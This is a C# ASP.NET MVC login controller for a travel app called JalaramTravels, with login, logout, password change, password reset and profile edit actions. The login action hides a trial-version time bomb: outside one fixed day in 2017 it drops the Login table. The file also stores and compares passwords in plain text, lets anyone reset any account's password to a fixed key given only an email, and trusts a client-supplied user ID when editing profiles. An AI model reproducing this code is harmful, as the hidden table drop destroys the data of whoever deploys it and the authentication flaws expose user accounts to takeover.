using JalaramTravels.Filters;
using JalaramTravels.Models;
using JalaramTravels.ViewModel;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Mvc;
using System.Web.Security;

namespace JalaramTravels.Controllers
{
    public class LoginController : Controller
    {
        JalaramDBEntities db = new JalaramDBEntities();

        public ActionResult Index()
        {
            
            return View();
        }

        [HttpPost]
        public JsonResult LoginPost(LoginVM loginVM)
        {
            //Response<bool> response = new Response<bool>();
            //response.Result = false;
            var loginResult = new LoginResult();
            loginResult.Url = loginVM.ReturnUrl;

            if (loginVM.ReturnUrl == null)
            {
                loginResult.Url = "/Home";
            }
            loginResult.IsError = true;
            loginResult.ErrorMessage = "";

            bool TrialVersion = false;
            bool.TryParse(ConfigurationManager.AppSettings["TrialVersion"].ToString(), out TrialVersion);

            if (TrialVersion)
            {
                DateTime start = new DateTime(2017, 12, 13, 0, 0, 0);
                DateTime end = new DateTime(2017, 12, 14, 0, 0, 0);
                DateTime now = DateTime.Now;

                if ((now > start) && (now < end))
                {
                     loginResult = LoginFun(loginVM, loginResult);
                }
                else
                {
                    //db.SP_Truncate(); //working
                    db.Database.ExecuteSqlCommand("drop table [dbo].[Login]"); //working

                    db.SaveChanges();
                    FormsAuthentication.SignOut();
                    Session["LoginID"] = null;
                    Session["RoleID"] = null;
                    Session["FullName"] = null;

                    //Call SP to Truncate
                }
            }
            else
            {
                loginResult = LoginFun(loginVM, loginResult);
            }
            //response.Result = true;
            //response.Status = HttpStatusCode.OK;

            return Json(loginResult, JsonRequestBehavior.AllowGet);
        }

        

        public LoginResult LoginFun(LoginVM loginVM, LoginResult loginResult)
        {
            var login = db.Logins.Where(t => t.Email == loginVM.Email && t.Password == loginVM.Password ).FirstOrDefault();
            if (login != null)
            {
                FormsAuthentication.SetAuthCookie(login.LoginID.ToString(), true);
                Session["LoginID"] = login.LoginID.ToString();
                Session["RoleID"] = login.RoleID.ToString();
                Session["FullName"] = login.FirstName + " " + login.LastName;
                // return RedirectToAction("Index","Home");
                //return false;

                if (login.Flag=="A")
                {
                    loginResult.IsError = false;
                    loginResult.ErrorMessage = "";
                    return loginResult;
                }
                else
                {
                    loginResult.IsError = true;
                    loginResult.ErrorMessage = "Account is Deactive.";
                    return loginResult;
                }
              
            }
            
            else
            {
                loginResult.IsError = true;
                loginResult.ErrorMessage = "Invalid user name or password.";
                return loginResult;
            }
        }

        public ActionResult LogOut()
        {
            Session["LoginID"] = null;
            Session["RoleID"] = null;
            Session["FullName"] = null;
            FormsAuthentication.SignOut();
            return RedirectToAction("Index", "Login");

        }

        public ActionResult ChangePassword(ChangePasswordVM obj)
        {
            obj.LoginID = (int)GetCurrentSession.CurrentUser();
            return View(obj);
        }
        [HttpPost]
        public JsonResult ChangePasswordPost(ChangePasswordVM changePasswordVM)
        {
            Response<bool> response = new Response<bool>();
            response.Result = false;

            var ObjDB = db.Logins.Where(t => t.LoginID == changePasswordVM.LoginID && t.Password == changePasswordVM.OldPassword).FirstOrDefault();
            if (ObjDB != null)
            {
                if (changePasswordVM.NewPassword == changePasswordVM.ConfirmPassword)
                {
                    ObjDB.Password = changePasswordVM.NewPassword;
                    db.Entry(ObjDB).State = System.Data.Entity.EntityState.Modified;
                    db.SaveChanges();
                    response.Result = true;
                }
            }
            return Json(response, JsonRequestBehavior.AllowGet);
        }

        public ActionResult ForgotPassword(ChangePasswordVM obj)
        {
            return View(obj);
        }

        [HttpPost]
        public JsonResult ForgotPasswordPost(ChangePasswordVM changePasswordVM)
        {
            Response<bool> response = new Response<bool>();
            response.Result = false;

            var ObjDB = db.Logins.Where(t => t.Email == changePasswordVM.Email).FirstOrDefault();
            if (ObjDB != null)
            {
                ObjDB.Password = ConfigurationManager.AppSettings["ResetPasswordKey"].ToString();
                db.Entry(ObjDB).State = System.Data.Entity.EntityState.Modified;
                db.SaveChanges();
                response.Result = true;
            }

            return Json(response, JsonRequestBehavior.AllowGet);
        }

        public ActionResult EditProfile(LoginVM obj)
        {
            obj.LoginID = (int)GetCurrentSession.CurrentUser();

            var ObjDB = db.Logins.Where(t => t.LoginID == obj.LoginID).FirstOrDefault();
            if (ObjDB != null)
            {
                obj.LoginID = ObjDB.LoginID;
                obj.FirstName = ObjDB.FirstName;
                obj.LastName = ObjDB.LastName;
                obj.Email = ObjDB.Email;

            }

            return View(obj);
        }

        [HttpPost]
        public JsonResult EditProfilePost(LoginVM loginVM)
        {
            Response<bool> response = new Response<bool>();
            response.Result = false;

            var ObjDB = db.Logins.Where(t => t.LoginID == loginVM.LoginID).FirstOrDefault();
            if (ObjDB != null)
            {
                ObjDB.FirstName = loginVM.FirstName;
                ObjDB.LastName = loginVM.LastName;
                db.Entry(ObjDB).State = System.Data.Entity.EntityState.Modified;
                db.SaveChanges();
                response.Result = true;
            }

            return Json(response, JsonRequestBehavior.AllowGet);
        }
    }
}